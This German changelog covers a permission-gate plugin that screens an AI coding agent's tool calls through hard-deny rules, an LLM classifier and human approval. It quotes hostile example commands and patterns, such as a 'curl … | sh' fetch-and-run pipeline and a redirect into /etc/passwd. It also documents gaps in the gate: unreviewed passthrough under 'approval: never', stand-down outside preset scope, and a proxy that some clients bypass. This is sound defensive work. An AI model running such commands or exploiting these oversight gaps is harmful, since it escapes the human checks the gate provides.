# Changelog

Sprachen: [English](./CHANGELOG.md) · [日本語](./CHANGELOG.ja.md) · [한국어](./CHANGELOG.ko.md) · [Français](./CHANGELOG.fr.md) · [Deutsch](./CHANGELOG.de.md) · [Italiano](./CHANGELOG.it.md) · [Русский](./CHANGELOG.ru.md) · [Español](./CHANGELOG.es.md)

Alle nennenswerten Änderungen an diesem Projekt werden in dieser Datei dokumentiert.

Das Format basiert auf [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
und dieses Projekt folgt der [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [2.6.0] - 2026-09-17

### Hinzugefügt

- **Regeltest (Dry-Run) in der Einstellungskarte.** Ein neues Panel bewertet einen hypothetischen
  Toolaufruf gegen den Regelsatz, den das Gate aktuell geladen hat, und zeigt das Verdict, die
  passende Regel (Index und Aktion), die Dimensionen, die sie einschränkt, und den Grund.
  Geschrieben für die Frage, die das YAML durch Ansehen nicht beantworten kann: *was wird das
  tatsächlich tun?* — `args` ist ein ODER über Tokens, eine leere Dimension schränkt nichts ein,
  und `command` matcht nur das zerlegte Befehls**wort**, sodass eine plausibel aussehende Regel
  tot bei Ankunft sein kann.

  Der Bericht trennt absichtlich zwei Antworten. **`verdict`** ist das Policy-Ergebnis der
  gesamten Kette (P0-Hard-Deny → Deny-Keyword → P1-Grant → P2-Regeln → P4-Ask → permissive).
  **`ruleLayer`** ist, was die `permissions`-Kette allein entscheidet, und nur diese Ebene kann
  einen Regelindex nennen: Ein P0-Hard-Deny oder ein Preset-Deny-Keyword zündet *vor* ihr und
  hinterlässt keine Regel, daher sagt das Panel das, statt eine unrelated Regel
  zuzuschreiben. `matchedDimensions` listet ebenso die Dimensionen auf, die die passende Regel
  *einschränkt*, nicht diejenige, die das Match „verursacht“ hätte — Dimensionen werden per UND
  verknüpft, also kann eine einzelne Ursache nicht ehrlich benannt werden. Ein `ruleCount` von 0
  wird als „0 Regeln geladen, prüfe den rulesFile-Pfad“ gemeldet, nicht als „nichts gematcht“.

- **`POST /api/dsh-perm-gate/dry-run`** — der Endpoint des Panels. **Konstruktionsbedingt
  nur lesend**: Es hat keine Schreibform, unbekannte Body-Keys werden verworfen statt
  weitergeleitet, und es berührt niemals Regeln, Grants, Lernzustand oder den Settings-Namespace.
  Ein Regeltest darf eine Regel nicht ändern können. Es evaluiert gegen die **lebende** Runtime
  statt einer frischen, daher testet das Panel die geltenden Regeln — eine frische Runtime würde
  die Kette von einer anderen Wurzel neu auflösen und könnte still über eine andere Datei
  antworten.

- **`src/dry-run.ts`** — `runDryRun` / `createDryRunRuntime`, der geteilte Evaluator für CLI und
  Route, dazu `PermGateRuntime.explainRules` (schreibgeschützter Regelebenen-Bericht) und
  `PermGateRuntime.explainCall` (reine Policy-Auswertung). `src/cli.ts` ist nun ein dünner
  Wrapper darüber; seine Ausgabe ist über neun wiedergespielte Aufrufe unverändert, byte-weise
  verifiziert (einschließlich der Fälle `--list`, kein Tool, kaputtes JSON und Schreibpfad).

### Behoben

- **Das Regeltest-Panel meldete `allow` für Aufrufe, die die Regeln an einen Menschen
  weitergeben.** Die erste Version evaluierte über den host-seitigen Pfad, der die
  Sitzungsebenen anwendet — den Preset-Rückzug und die `approval: never`-Ask-Degradation. Ein
  Dry-Run ohne Sitzung hat keine Sitzung, also antwortete der Policy-Leser „never“, jedes `ask`
  degradierte zum Durchgriff, und das Panel zeigte **allow** für genau die Regeln, derentwegen
  man es öffnet. Am Live-Host gemessen: `shell ls -la` zeigte `allow`, während die Regelebene
  derselben Karte `ask` sagte.

  `runDryRun` meldet nun das **reine Policy**-Verdict aus `explainCall`: dieselbe Kette
  P0 → Deny-Keyword → P1 → P2 → P4, mit den Sitzungszustands-Ebenen ausgeschlossen statt
  geraten, und mit `reason`, das nie auf ein bloßes `(default/passthrough)` zusammenschrumpft.
  Die host-seitige Sicht bleibt unter `input.hostView` verfügbar; die CLI fragt sie an, sodass
  ihre historische Ausgabe byte-identisch bleibt (erneut verifiziert: 9/9 Fälle, SHA256 je
  Fall).

- **Die „nur lesende“ Route war nicht nur lesend.** Sie lief den host-seitigen
  Entscheidungspfad gegen die Live-Runtime, der Audit-Einträge anhängt und
  Entscheidungsereignisse aufzeichnet — das Öffnen des Regeltest-Panels schrieb in den
  Live-Entscheidungsfeed. Der reine Pfad hängt nichts an, und `test/dry-run.spec.ts` behauptet
  nun, dass ein Aufruf, den der Host-Pfad *aufzeichnen würde*, den Audit-Spiegel auf null lässt.

## [2.5.0] - 2026-09-17

### Hinzugefügt

- **Regeldimension `branch`** — git-Branch-/Remote-/Protected-Branch-Matching, damit eine Regel
  endlich „kein Push auf einen geschützten Branch“ sagen kann, ohne unbeteiligte Befehle zu
  erwischen. Der entscheidende Fall ist der, den `args` nie ausdrücken kann:
  `git push --force origin main` (gefährlich) und `git checkout --force main` (alltäglich)
  tragen *dieselben Tokens*, und nur die Branch-Dimension unterscheidet sie. Unterfelder:
  `target` (Branch-Name-Glob, `*` kreuzt `/`), `remote` (Remote-Name-Glob) und `shared`
  (geschützten Branch verlangen). Kandidaten kommen aus dem gemeinsamen
  Befehls-Dispatcher, daher sind `refspec`-Formen (`HEAD:main`) bereits zerlegt und ein
  Remote-Name wird nie mit einem Branch-Namen verwechselt. Dokumentiert in
  `docs/rules-format.md` §4.11.

### Behoben

- **Die Multi-File-Regelkette leerte still jede Match-Dimension.** `resolveRuleChain` merging
  Einträge von Hand mit `tools: []`, `command: []`, `args: []` und `paths: []`. Eine leere
  Dimension heißt „keine Einschränkung“, also matchte JEDER gemergte Eintrag JEDEN Aufruf: der
  erste `deny`-Eintrag verweigerte alles in seiner Partition, und der erste `allow`-Eintrag
  erlaubte alles, bevor die `ask`-Partition je befragt wurde. Das Merge läuft nun über dasselbe
  `compileRuleEntry`, das der Single-File-Pfad nutzt.

  *Reichweite:* Der Chain-Resolver wird **nur** unter `searchUp: true` erreicht
  (Produktdefault `false`, und in einem unveränderten Profil nicht gesetzt), daher war der
  Default-Single-File-Pfad — `compileDocument` — nie betroffen. Deshalb blieb auch die
  bestehende Suite grün: kein Test trieb eine Regeln-*Datei* durch die Kette.
  `test/rule-chain.spec.ts` tut es nun. Ein separater, weiter offener Defekt auf demselben
  Opt-in-Pfad ist im Plan vermerkt: `findChainEntries` fügt die konfigurierte `rulesFile` an
  jedes Verzeichnis an, sodass der absolute Pfad, den `resolveRulesFile` immer erzeugt, auf
  nichts matcht und die Kette einen leeren Regelsatz ohne Fehler liefert.

- **`argv.pipeline` konnte sein eigenes Subjekt nicht sehen.** Der Pipeline-Match-String wurde
  aus `SimpleCommand.command` gebaut, das nur das Befehls*wort* ist — `curl https://x.sh | sh`
  kollabierte zu `curl|sh`, daher matchte das dokumentierte `curl|sh`-Muster die harmlose
  benachbarte Form, während die wirklich gefährliche mit Argumenten gar nicht matchte. Der
  Match-String ist nun die volle argv jedes einfachen Befehls (verbunden mit `|`), und die Doku
  stellt klar, dass `|` in einem Muster literal ist; Argumente abzudecken verlangt `curl*|sh`.

- Neun vorbestehende `eslint`-Fehler (ungenutzte Imports/Konstanten und ein `prefer-const` in
  `src/parsers/` und `test/command-parsers.spec.ts`) — `npm run lint` ist wieder grün.

## [2.4.1] - 2026-09-17

### Behoben

- Die Freigabehistorie zeigte den rohen `preset-passthrough`-String für das eine Ereignis, das
  erklärt, *warum* ein markierter Aufruf unreviewt lief: Die Stufe deklariert `approval: ask`,
  die Sitzung war auf `never` überschrieben, und das Ask des Gates degradierte daher zum
  Durchgriff. Es rendert nun als lesbare Beschriftung wie jedes andere Verdict.

## [2.4.0] - 2026-09-17

### Geändert

- **Der P3-LLM-Klassifikator ist escalate-only — er kann nicht mehr verweigern.** Ein
  `risky`-Verdict mit einer harten Kategorie (`deletion` / `credential` / `remote` / `system` /
  `bulk`) verweigerte bisher **automatisch** ohne Panel; nun **behält er die menschliche
  Nachfrage**. Verweigern bleibt allein den deterministischen Schichten vorbehalten —
  P0-Hard-Deny, die Deny-Keyword-Blacklist, explizite `deny:`-Regeln — denn ein probabilistisches
  Verdict darf keinen nicht anfechtbaren Block aussprechen. Live gemessen: Der Grader stufte ein
  harmloses `git commit -F …` als **`remote`** ein, und das Auto-Deny ließ weder ein Panel zur
  Freigabe noch einen Grant zum Wiederholen übrig; nur ein manueller Retry (der zufällig `safe`
  eingestuft wurde) kam vorbei. Damit richtet sich der Code auch nach der eigenen Regel des
  Projekts: Hochrisiko-Operationen werden **deterministisch** abgefangen, nie nach dem Urteil des
  LLM.

### Hinzugefügt

- Harte Risikokategorien behalten einen bedeutsamen Unterschied zu `neutral`: Sie sind **nie
  lernbar**. Wiederholte menschliche Freigaben können ein `deletion`/`credential`/`remote`/
  `system`/`bulk`-Verdict nicht zu einem Auto-Allow sedimentieren (früher galt das nur als
  Nebeneffekt des Auto-Deny; jetzt ist es eine explizite Eigenschaft).

### Verhaltenshinweise

- Unter `approval: never` degradiert ein Ask, den das Gate nicht zustellen kann, weiterhin zum
  Durchgriff, sodass ein klassifikatorisch markierter Aufruf nun **läuft**, wo er früher
  automatisch verweigert wurde. Das ist die direkte Folge von „verweigere nur, was
  deterministisch gefährlich ist, verhandle alles andere“: Eine Verhandlung braucht einen
  Menschen, und `never` heißt, es gibt keinen. Betreiben Sie das Gate in einer Stufe, deren
  `approval` `ask` ist, damit die Markierungen Sie erreichen.

## [2.3.0] - 2026-09-17

### Hinzugefügt

- **Ein Rückzug ist nicht mehr lautlos.** Lag der Berechtigungs-Preset der Sitzung außerhalb der
  `gatePresets`, zog sich das Gate zurück und zeichnete nichts auf — der Toolaufruf sah also
  exakt wie einer aus, den das Gate geprüft und erlaubt hatte. Es zeichnet nun **eine**
  `stand-down`-Notiz pro (Sitzung, Preset)-Übergang auf (nie pro Aufruf), mit Nennung des
  Presets, des Geltungsbereichs und der Tatsache, dass das P0-Hard-Deny inaktiv ist. Der Browser
  rendert sie als klebendes **GATE OFF**-Band über der Eingabe, und die Freigabehistorie zeigt
  ein `Gate off`-Tag.
- Die 自动审查-Einstellungskarte nennt den eigenen Preset-Geltungsbereich des Gates
  (`gatePresets`, Default `permissive` / `permissive-full`) und was außerhalb passiert, sodass
  der Bereich dort sichtbar ist, wo die Stufe konfiguriert wird.

### Geändert

- **P0s dokumentierte Positionierung ist begrenzt, nicht global.** Das P0-Hard-Deny ist monoton
  und nicht verhandelbar *innerhalb des Preset-Geltungsbereichs des Gates*; über Presets hinweg
  zieht sich das Gate vollständig zurück — P0 eingeschlossen —, weil die eigene Policy der
  gewählten Stufe diese Sitzung besitzt. Der Code verhielt sich stets so; `AGENTS.md` und die
  vier READMEs behaupteten das Gegenteil, wodurch `danger-full-access` als „P0 gilt weiterhin“
  gelesen wurde. Setzen Sie `gatePresets: ['*']`, um P0 wieder global zu machen.

### Behoben

- `DEFAULT_GATE_PRESETS` / `resolveGatePresets` zogen aus `config.ts` (das schemastery importiert)
  in das abhängigkeitsfreie `preset.ts`, damit die Browser-Hälfte den Geltungsbereich rendern
  kann, ohne eine node-only-Abhängigkeit in den Client-Bundle zu ziehen. `config.ts` re-exportiert
  beide; bestehende Imports bleiben unverändert.

## [2.2.0] - 2026-09-17

### Behoben

- **P0-Hard-Deny übersprang jedes Shell-Tool außer vier.** `hardDenyReason` knüpfte seine
  Shell-Inspektion an eine lokal definierte Regex, `/^(?:bash|pwsh|sh|cmd)$/`, die **nicht** auf
  `shell`, `terminal` oder `powershell` passt. `shell` ist DSHs primäres Shell-Tool, also war
  die gesamte P0-Shell-Prüfung — der Redirect-Schutz für geschützte Pfade — **für die häufigste
  Aufrufform wirkungslos**. Gemessen, derselbe Befehl `echo x > /etc/passwd`: blockiert über
  `bash`, **erlaubt** über `shell`. `engine.ts` importiert nun `SHELL_TOOLS` aus `evaluate.ts`;
  das Gate hielt drei Kopien dieser einen Tatsache, und nur eine war vollständig.
- **`git push --delete` wurde als gewöhnlicher Push geparst.** `hasDelete` wurde in
  `analyzeSubcommand` berechnet, aber nur im `branch`-Fall gelesen, daher fiel `git push --delete
  origin main` in den Plain-Push-Zweig (`destructiveness: 4`), und der `DESTRUCTIVENESS_MAP`-Eintrag
  `'push-delete': 5` war tote Daten.
- **Die Erkennung geschützter Branches zündete bei jedem Namen mit einem Schrägstrich falsch.**
  Das Prädikat schnitt alles vor dem letzten `/` ab, daher wurden `backup/main` und
  `feat/release` als geschützt gelesen. Es schneidet nun nur bekannte Ref-Präfixe ab
  (`refs/heads/`, `refs/tags/`, `refs/remotes/<remote>/`). Die Richtung zählt: Dieses Prädikat
  speist ein **nicht entfernbares** P0, wo ein Fehlgriff noch die Keyword-/Regel-/LLM-Schichten
  hinter sich hat, während ein Falsch-Positiv einen legitimen Workflow ohne Rückgriff blockiert.

### Hinzugefügt

- **P0-Hard-Deny für Remote-History-Rewrite auf einem geschützten Branch.** Ein `git push`, der
  `main` / `master` / `production` / `release` / `stable` per Force überschreibt oder löscht,
  wird deterministisch abgewiesen, vor jedem LLM-Aufruf. Der bisherige Schutz war das flache,
  branch-blinde, namespace-überschreibbare Keyword `'push --force'`; dies ist der nicht
  verhandelbare Boden darunter.
  - **Escalate-only durch Konstruktion, nicht durch Konvention**: Der Helper gibt
    `string | undefined` zurück, was der Aufrufer als deny / unentschieden liest. Er hat keine
    Möglichkeit, allow auszudrücken, sodass die Verdrahtung in P0 nicht verbreitern kann, was das
    Gate erlaubt.
  - Absichtlich **nicht** abgedeckt (weiterhin den Keyword-/Regel-/LLM-Schichten überlassen):
    Force-Push auf einen nicht geschützten Branch, `git push --force` ohne benannten Branch und
    gewöhnliche Pushes.
  - Erster Produktionseinsatz des Command-Parsers (`command-dispatcher`, `command-semantics`,
    `parsers/git`, `parsers/shell-cmds`), der bisher nur von seiner eigenen Testdatei referenziert
    wurde.

### Tests

- Neue Suite `test/git-protected-push.spec.ts` (13 Fälle): Parser-Varianten, das
  Protected-Branch-Prädikat in beide Richtungen, volle `SHELL_TOOLS`-Abdeckung, die vier
  absichtlich erlaubten Formen und die Segmentierung zusammengesetzter Befehle
  (`git status && git push --force origin main`).
- **Falsifiziert**: Das Revertieren jedes der drei Fixes färbt genau die sie bewachenden Fälle
  rot (7 Fehler insgesamt), während die absichtlichen Erlaubnis-Fälle grün bleiben.
- Volle Suite **40 Dateien / 459 Fälle**; `typecheck` sauber.

## [2.1.2] - 2026-09-15

### Hinzugefügt

- **Der Composer-Glyph-Patch wird nun mit dem Paket ausgeliefert.** `scripts/patch-permission-glyph.mjs`
  ist in `files` auf die Whitelist gesetzt und als das Bin **`dsh-perm-gate-patch-glyph`**
  exponiert, sodass das erneute Anwenden des Host-Bundle-Patches nach einem DSH-Upgrade keinen
  Source-Checkout mehr braucht:

  ```sh
  npx dsh-perm-gate-patch-glyph            # apply
  npx dsh-perm-gate-patch-glyph --check    # report only; exits 1 if the glyph is missing
  ```

  In einem Checkout erledigen `npm run patch:glyph` und `npm run patch:glyph:check` dasselbe.

  Er ist bewusst **kein** `postinstall`. Das Skript editiert ein **Host**-Paket, und ein Plugin
  darf den Harness, in den es installiert ist, nicht unaufgefordert umschreiben. (pnpm 10+
  blockiert Installationsskripte standardmäßig, sofern nicht allowgelistet, daher wäre ein
  `postinstall` auch ein Versprechen gewesen, das still nie läuft — schlimmer als ein expliziter
  Befehl.)

### Geändert

- Das Skript ist nun testbar: seine reinen Teile sind exportiert (`sliceEntry`, `applyGlyphPatch`,
  `candidateBundles`, `findBundle`) und von `test/glyph-patch.spec.ts` gepinnt (11 Fälle). Die
  Klammer-Balance-Invariante ist die entscheidende — die erste Version des Slicers scannte von
  der falschen Klammer und erzeugte einen unparsebaren Bundle, den nur der eigene
  `node --check`-Wächter des Skripts erwischte.
- `candidateBundles` sondiert zusätzlich den gehoisteten Per-Profile-Scope unter `$DSH_HOME`, und
  die CLI ist ein No-op beim Import (der Hauptblock läuft nur, wenn die Datei der Einstiegspunkt
  ist).

## [2.1.1] - 2026-09-15

### Hinzugefügt

- **Netzwerk-Ausführungsfläche (Opt-in, standardmäßig aus).** Ein lokaler HTTP/CONNECT-Proxy
  entscheidet den ausgehenden Verkehr von *Shell-Subprozessen* anhand derselben Regeldatei, plus
  ein interaktiver Freigabepfad für Ziele, die keine Regel abdeckt. Eine `deny`-Regel wird nie
  eskaliert — eine Freigabe weitet die Reichweite eines nicht gelisteten Ziels, kann aber nie
  eine Regel überstimmen, die Nein sagt. Neue Konfiguration: `networkEnabled` (Default `false`),
  `networkMode`, `networkUnlisted`, `networkUnattributed`, `networkBind`, `networkPort`,
  `networkNoProxy`, `networkInjectEnv`, `networkAskTimeoutMs`, `networkGrantTtlMs`. Diagnostik
  unter `GET /api/dsh-perm-gate/network`. Abgedeckt durch `test/network.spec.ts`,
  `test/proxy-errors.spec.ts`, `test/network-lifecycle.spec.ts` und
  `test/network-approval.spec.ts`.
- **Zwei 自动审查-Stufen.** `permissive` behält die eingebaute Datei-Sandbox; `permissive-full`
  (Label 自动审查（高权限）) paart dasselbe Freigabeverhalten mit `danger-full-access`. `sandbox`
  und `approval` eines Presets sind unabhängige Stellschrauben, und ihre Kopplung erzwang einen
  Kompromiss: Die `workspace-write`-Sandbox verweigert auch die benannten Pipes, die ein
  Kindprozess zum Starten braucht, daher scheiterten `git clone`, MSYS2/Cygwin-`sh.exe` und
  ConPTY unter der einzigen Stufe, in der das Gate aktiv war. Beide Stufen stehen im Default der
  `gatePresets`.
- **Regelmodell-Ausbau.** Sechs neue Match-Dimensionen (`params` / `absent` / `agents` / `when` /
  `argv` / `network`), eine Multi-File-Regelkette mit `searchUp` und einem Fallback-Pfad sowie
  Shadow-Erkennung für unerreichbare Regeln. Neue Konfiguration: `searchUp`, `fallbackPath`,
  `badFilePolicy`, `maxChainLength`.
- **Regel-Hot-Reload.** Ein chokidar-Watcher lädt die effektiven Regeldateien neu, mit Debounce,
  LRU-Verdrängung über Workspaces und Kandidaten-Datei-Beobachtung über den tiefsten existierenden
  Vorfahren, sodass eine mitten in der Sitzung angelegte Regeldatei übernommen wird. Neue
  Konfiguration: `watch` (Default `true`), `watchDebounceMs`.

### Behoben

- **Eine blockierte Verbindung konnte den Host töten.** Als der Proxy einen CONNECT mit 403
  beantwortete, erzeugte das RST des Clients ein `ECONNRESET` ohne angehängten Handler, das zu
  einem unbehandelten `'error'`-Ereignis eskalierte und den DSH-Prozess beendete. Socket-Error-Handler
  werden nun beim Verbindungsaufbau angehängt, mit `clientError`- und Handler-Rejection-Fallbacks
  dahinter. Ein Policy-Proxy darf seinen Host nie zu Fall bringen.
- **Eingebaute Tools fragten nach Freigabe.** Die Auto-Allow-Liste wurde von Hand gepflegt, also
  waren Tools, die seither in DSH kamen, daraus abgedriftet, und ein schreibgeschützter Aufruf
  konnte eine Freigabeaufforderung auslösen: `advanced_search`, `platform_search`,
  `free_search_test`, `context_compression_retrieve`, `memory_search_graph`,
  `memory_expand_graph_node`, `memory_import`, `memory_ruminate`, `memory_ruminate_cancel`,
  `memory_ruminate_status`.
- **Proxy-Lifecycle-Rennen.** `close()` wartet nun auf ein laufendes Bind, statt dagegen zu
  rennen, ist begrenzt, und gleichzeitige `start()`-Aufrufe teilen sich ein Bind. DNS-Auflösungen
  sind zeitlich begrenzt, die Verbindungsaufbauphase ist begrenzt, gleichzeitige Verbindungen sind
  gekappt, und ein werfender Logger kann nicht mehr in einen Absturz eskalieren. Der Proxy-Abbau
  wird registriert, bevor das Bind abgewartet wird, sodass ein früheres Dispose keinen gebundenen
  Port oder ein umgeschriebenes `process.env` lecken kann.
- **`permissive-full` hatte kein Icon im Composer-Picker.** Die Glyph-Map des Pickers ist
  geschlossen und gibt, nach eigenem Kommentar, Host-konfigurierten Namen keins, sodass
  自动审查（高权限） nur als Text erschien, während 自动审查 Schild+Auge zeigte.
  `scripts/patch-permission-glyph.mjs` fügt den fehlenden Eintrag in diese **Host**-Map ein:
  idempotent, Slicing nach Klammer Tiefe, und es macht `node --check` über seine eigene Ausgabe
  und stellt das Backup bei Fehlschlag wieder her. Er patcht ein Host-Paket, muss also nach jedem
  DSH-Upgrade neu laufen — die Neuinstallation des Plugins stellt ihn **nicht** wieder her, denn
  `dsh plugin … add` schreibt nur das `node_modules` des Profils. Dokumentiert in allen vier
  Installationsanleitungen.

### Geändert

- `networkUnattributed` defaulted auf `allow`: Verkehr ohne Shell-Zuordnung ist DSHs eigener
  Client (ein eingebautes Netzwerk-Tool, der LLM-Transport), und ihn zu prüfen würde den Host
  erlauben, sich selbst zu blockieren. Für das strengere Verhalten `deny` setzen.
- `networkUnlisted` defaulted auf `ask`.
- `DEFAULT_GATE_PRESETS` ist nun `['permissive', 'permissive-full']`.

### Dokumentiert

- **Der Netzwerk-Proxy ist eine kooperative Policy-Schicht, keine Durchsetzungsgrenze.** Er sieht
  nur Clients, die die Proxy-Umgebung lesen. Gemessen, nicht angenommen: `curl` läuft durch ihn,
  während `node` `http`/`https`/`fetch` direkt verbindet, ebenso Raw Sockets, DNS, QUIC,
  Literal-IP-Ziele und Java/.NET-Default-Clients. In allen vier READMEs festgehalten.

- **Session-Sweep — die Autorisationskette folgt nun dem Sitzungslebenszyklus.** Beim
  Plugin-Start und stündlich liest das Gate den Workspace-Speicher von DSH
  (`$DSH_HOME/storages/workspace.json`, nur lesend) und klassifiziert jede Sitzung, für die es
  Gate-Daten hält. Sitzungen, die DSH archiviert hat (`global.archivedSessionIds`) oder gar nicht
  mehr führt, verlieren ihre Entscheidungsereignisse aus `$DSH_HOME/perm-gate/events.jsonl`
  (atomares tmp+rename-Umschreiben, nur wenn etwas entfernt wird), und ihre Snapshot-Dateien vor
  der Änderung werden aus `$DSH_HOME/perm-gate/snapshots/` gelöscht. Lebende Sitzungen bleiben
  unberührt; nicht zuordenbare Zeilen (leere Sitzungs-ID, unparsbare Zeile/Datei) werden nie
  gelöscht; jeder E/A-Fehler ist fail-open (der Durchlauf wird übersprungen und eine Stunde
  später wiederholt); der Stundentimer ist `unref`'t und wird mit dem Plugin entsorgt. Neue
  Konfiguration: `sessionSweep` (Default `true`), `workspaceStoreFile` (Default
  `<dshHome>/storages/workspace.json`). Beachten Sie, dass die Wiederherstellung einer
  archivierten Sitzung deren weggesäuberte Historie nicht wiederherstellt. Abgedeckt durch
  `test/session-sweep.spec.ts` (13 Unit-Fälle) und `test/session-sweep-apply.spec.ts`
  (End-to-End-Verdrahtung).

## [2.0.0] - 2026-09-11

### Behoben

- **Das Gate zog sich bei DSH 0.1.2 bei jedem Aufruf zurück, sodass die Approvals-Seite leer
  blieb.** Der Permission-Preset-Fold der Sitzung las das Log als `exec.agent.session.events`.
  DSH 0.1.1 exponierte dieses Array; 0.1.2 machte das Log privat hinter
  `Session.snapshotEvents()` / `ownEvents()` und behielt kein `events`-Member, also lieferte die
  Lesung `undefined`, `presetOf` antwortete `undefined`, und
  `presetInScope(undefined, ['permissive'])` machte `gateActive` für **jeden** Aufruf falsch:
  keine Regel-, Grant-, Deny-Keyword-, Klassifikator- oder P0-Hard-Deny-Entscheidung, und kein
  Audit-Ereignis — auch in Sitzungen, die die eigene Gate-Stufe gewählt hatten, weshalb der Tab
  „本会话暂无审批记录“ zeigte statt eines Fehlers. Der Fold liest das Log nun über jede bekannte
  Accessor-Form (`events`-Array, `snapshotEvents()`, `ownEvents()`) und degradiert nur zu „keine
  Ereignisse“, wenn der Host keine exponiert; der Fold-Cache keyed auf die Länge des Logs plus
  der Identität seines letzten Ereignisses, da ein 0.1.2-Snapshot bei jeder Lesung ein frisches
  Array über dieselben eingefrorenen Ereignisse ist. `test/preset-scope.spec.ts` pinnt beide
  Formen: Eine `0.1.2`-förmige Sitzung muss eine Entscheidung liefern (und ein aufgezeichnetes
  Ereignis), und ein gewachsenes Log muss neu falten, damit ein Preset-Wechsel beim nächsten
  Aufruf greift.

### Geändert

- **Die Versionsserie der `main`-Linie ist nun `2.x` und folgt der DSH-Linie, die sie bedient.**
  `1.x` ist die DSH-`<= 0.1.1`-Linie und `2.x` die DSH-`0.1.2+`-Linie, sodass eine
  Plugin-Version sagt, für welches DSH sie gebaut wurde; `2.0.0` ist die erste Release der neuen
  Serie, und die `0.2.x`-Releases (`0.2.0`, `0.2.1-beta.2`…`beta.5`) werden davon abgelöst. Die
  Majors zäunen einander ein — `^1.0.0` löst `2.0.0` nicht auf und `^2.0.0` löst `1.0.0` nicht —
  daher muss eine bestehende `^0.2.1-beta.4`-Installation (die `2.0.0` ebenfalls nicht auflöst)
  bewusst angehoben werden. `engines.dsh` sagt dieselbe Trennung aus (`>=0.1.2-alpha.1 <0.2.0-0`
  hier, `>=0.1.0-rc.7 <0.1.2-alpha.1` auf `legacy`), aber DSH liest es nie: Die Versions-Ranges
  und Dist-Tags sind es, die ein altes DSH auf `1.x` halten.
- **Die Berechtigungsstufe ist auf jeder Fläche mit 自动审查 beschriftet, ohne Icon.** Der
  `name:` des Presets in `cordis.patch.yml` ist nun der chinesische Produkt-String, und die
  Default-Zeile der allgemeinen Einstellungen, der Composer-Picker und der
  Plugin-Settings-Tab zeigen ihn alle. DSH 0.1.2 rendert den `name:` einer Plugin-Stufe wörtlich
  und lokalisiert nur die drei eingebauten Werte (`仅可查看` / `工作区内修改` / `完全权限`); der
  eine Host-gelieferte String ist also, was eine zh-Sitzung sieht; der Maschinenwert der Stufe
  bleibt `permissive`, womit `gatePresets` matcht. Die Icon-Dekoration des
  Berechtigungs-Pickers ist entfernt (`src/client/permission-icon.ts` gelöscht): Sie existierte,
  um das Schild-Glyph der ausgemusterten `auto`-Stufe nachzubilden, sie griff über den
  0.1.2-Selektor `aria-haspopup="menu"` auf die Settings-Zeile, und eine Plugin-Stufe zeichnet
  kein Glyph, weil die Composer-Glyphs nur auf die eingebauten Werte keyed sind.

## [0.2.1-beta.4] - 2026-09-11

### Hinzugefügt

- `trustEscalation`-Strategie in der Permissive-Stufe (standardmäßig an, solange die Stufe an
  ist): Eine Sandbox-Eskalationsfreigabe für einen Aufruf, den dieses Gate bereits erlaubt hat,
  wird hier mit `allowed-once` beantwortet, statt Sie zu fragen. Die Eskalation wird von
  `approveEscalation` aus *dem Inneren* des shell-/pwsh-/edit-Toolkörpers gestellt — nachdem
  `tools/pre-execute` sich erledigt hat —, sodass das eigene Allow des Gates sie nie erreichte
  und ein vom LLM als `safe` eingestufter Aufruf Sie trotzdem bat, die Ausweitung zu genehmigen.
  Nur der exakte Aufruf, den das Gate freigab (an `callId` und Toolname gematcht), überspringt
  die Nachfrage, und nur für einen erkannten Eskalationsgrund, der `workspace-write` /
  `danger-full-access` nennt; alles andere delegiert unverändert an den Menschen. Die
  Auto-Antwort wird im Ereignis-Feed aufgezeichnet (`verdict:"escalation-auto"`, `mode:<Ziel>`).
  Schalten Sie den Schalter aus, um Sandbox-Ausweitungen menschlich gateen zu lassen.

### Behoben

- Die Einstellungskarte befüllt die editierbare Whitelist nun aus der Regeldatei.
  `installSettingsSection` rief `scope.set('allowlist', …)` auf dem **Host**-Settings-Scope auf,
  der nur `get` / `watch` / `update` / `replace` exponiert — `set(field, value)` ist der
  *Client*-Convenience-Wrapper über `mutate()`, ein anderes Objekt —, daher warf der Aufruf, und
  der Namespace blieb unbefüllt. Nun nutzt es `scope.update({ allowlist: … })`.
- Der `approval/request`-Listener wird mit `prepend` registriert und ist nun ein antwortendes
  Gate statt eines passiven Beobachters, sodass er vor der Remote-Bridge sitzt, die die
  Browser-Abfrage rendert. Ein Listener hinter dieser Bridge konnte nur eine bereits gezeigte
  Abfrage aufzeichnen.
- Die Browser-Hälfte importiert `@deepseek-ai/dsh-client-runtime` nicht mehr, das DSH in
  `0.1.2-alpha.1` entfernt hat. `ClientContext` kommt nun aus `@deepseek-ai/cordis` — dem Alias,
  den DSH 0.1.1 als `export type ClientContext = Context` definierte, sodass er denselben Typ
  auf beiden Linien benennt — und die Einstellungskarte deklariert die vier Scope-Member, die
  sie nutzt, lokal (`SettingsScopeLike`), dasselbe Local-Face-Muster, das die Host-Hälfte schon
  für den Host-`settings`-Dienst nutzt. Der Client-Vertrag ist auf beiden Linien byte-identisch;
  nur sein exportierendes Paket ist umgezogen.

### Geändert

- DSH-Kompatibilität kommt nun als **zwei langlebige Branches** daher, jeder mit eigener
  Versionsserie, eigenem `engines.dsh` und eigenem npm-Dist-Tag: `main` / `0.2.x` /
  `>=0.1.2-alpha.1 <0.2.0-0` / `latest`, und `legacy` / `1.x` / `>=0.1.0-rc.7 <0.1.2-alpha.1` /
  `legacy`. Dieser Branch ist `main`. Siehe `RELEASING.md` für die Branch-Aufteilung und den
  Cherry-Pick-Fluss.
- Auf dieser Linie wird `ctx.slots` von `@deepseek-ai/dsh-client-ui-renderer/client` deklariert —
  ab `0.1.2-alpha.1` ist `@deepseek-ai/dsh-client-runtime` weg —, daher importiert der
  Client-Eintrag es von dort.
- Client-DevDependency-Floors von `^0.1.0-rc.7` auf `^0.1.5-rc.2` angehoben, und
  `@deepseek-ai/dsh-client-ui-renderer` hinzugefügt. Der alte Floor bedeutete, dass der Build
  immer nur das 0.1.0-rc.8-Paketset auflösen konnte, sodass diese Linie nie dagegen kompiliert
  wurde.
- `npm run verify:line` (`scripts/verify-line.mjs`) installiert die Linienpakete dieses Branches
  mit `npm install --no-save` und läuft typecheck + Tests + Build gegen sie, sodass ein Build
  immer gegen die Pakete kompiliert, für die der Branch ausliefert. `npm run verify:lines` ist
  eine Opt-in-Drift-Prüfung, die auf beiden Linien baut und die Bundles vergleicht.

## [0.2.1-beta.3] - 2026-09-10

### Hinzugefügt

- Risikogestufter `llmAssist`: das konfigurierte eigene LLM (jeder OpenAI-kompatible Endpoint)
  stuft jedes `ask` als `safe` / `risky:<Kategorie>` ein; harte Kategorien (deletion / credential
